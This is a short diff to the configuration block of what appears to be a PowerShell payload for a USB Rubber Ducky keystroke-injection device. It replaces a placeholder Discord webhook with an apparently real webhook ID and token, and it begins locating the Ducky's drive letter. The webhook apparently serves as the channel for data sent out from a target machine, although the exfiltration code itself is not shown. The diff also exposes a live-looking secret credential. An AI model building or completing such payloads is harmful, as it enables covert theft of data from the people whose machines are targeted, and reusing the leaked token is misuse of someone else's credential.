@@ -1,6 +1,6 @@
 #-- Payload Configuration --#
 $DRIVE = 'DUCKY'             
-$webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN" # Replace with your webhook
+$webhookUrl = "https://discord.com/api/webhooks/1341467467826073611/KkgCiS0CK8REXV7RI__iHBbFFgt95HZmb59PDNt6s16CS-ytYAOvS_BR8Xu546-8cJzm" # Replace with your webhook
 
 # Get drive letter of USB Rubber Ducky
 $duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DRIVE }).DeviceID
